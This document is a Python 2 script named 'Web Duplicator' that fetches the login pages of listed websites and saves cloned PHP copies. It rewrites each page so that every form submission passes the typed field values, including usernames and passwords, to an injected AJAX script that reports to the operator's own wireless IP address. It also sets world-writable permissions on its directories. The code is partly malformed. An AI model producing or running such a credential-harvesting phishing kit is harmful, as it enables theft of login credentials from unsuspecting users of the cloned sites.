#!/usr/bin/python
def manipulate(source , cur_url):
	source = source.replace('"/' , chr(34) + cur_url + '/')
	changing_ids = source.split('id="')
	tmp = changing_ids[0]
	counter = 1
	while counter < len(changing_ids)-1:
		tmp = tmp + 'id="' + str(counter) + changing_ids[counter]
		counter = counter + 1
	source = tmp
	if source.count("<?") == 1:
		modify_xml = source.split("<?")
		xml_line = modify_xml[1].split(">")[0]
		source = source.replace(xml_line , "php echo " + chr(39) + "<?" + xml_line + ">" + chr(39) + ";?") 
        AJAX_readymade = open("AJAX_script" , "r")
	AJAX_fixed = AJAX_readymade.read()
	ad = "http://" + str(netifaces.ifaddresses("wlan0").get(netifaces.AF_INET)[0]['addr'])
	AJAX_fixed = AJAX_fixed.replace("HERE" , ad)
        adding_AJAX = source.split("<html , 1")
        source = adding_AJAX[0] + AJAX_readymade.read() + "<html" + adding_AJAX[1] + "/html>"
        adding_onsubmit = source.split("<form")
        source = adding_onsubmit[0] + "<form"
        counter = 1
        while counter < len(adding_onsubmit):
		if adding_onsubmit[counter].count('onsubmit="') == 0:
                	source = source + ' onsubmit="'
               		inputs = adding_onsubmit[counter].split('name="')
               		for names in inputs:
				if names.split(chr(34))[0].count("=") == 0 and not names == "":
               		        	source = source + "saveg(" + names.split(chr(34))[0] + ".value); "
			source = source + chr(34) + adding_onsubmit[counter] + "<form"
		else:
			adding_to_exists = adding_onsubmit[counter].split('onsubmit="')
			inputs = adding_onsubmit[counter].split('name="')
			source = source + adding_to_exists[0] + 'onsubmit="'
			for names in inputs:
				if names.split(chr(34))[0].count("=") == 0 and not names == "":
					source = source + " saveg(" + names.split(chr(34))[0] + ".value);"
			source = source + adding_to_exists[1] + "<form"
       		counter = counter + 1
	replacing_action = source.split("<form")
	source = source.replace(replacing_action[1].split('action="')[1].split(chr(34))[0] , cur_url[:-5])
	return source
import os
import requests
import netifaces
os.system("touch data.txt ; chmod 777 * ; cd .. ; chmod 777 *")
print "              -----Welcome to the Web Duplicator-----"
file_ready = "n"
while not file_ready == "y":
	file_ready = raw_input("[$] Please list to hosts you want to sniff in sniff.txt\n[$] Is sniff.txt ready? y/n : ")
target_sites = open("sniff.txt","r")
for site in target_sites:
	current = open(site[:-1] + ".php" , "w")
	cur_url = "http://www." + site[:-1] + ".com/login"
	lnk = requests.get(cur_url)
	con = lnk.content
	if con.count("<form") == 0:
		print "[$] " , cur_url , " Has no forms. skipping it."
		current.write(con) 
	current.write(manipulate(con , cur_url))
print "[$] We are ready to go"  
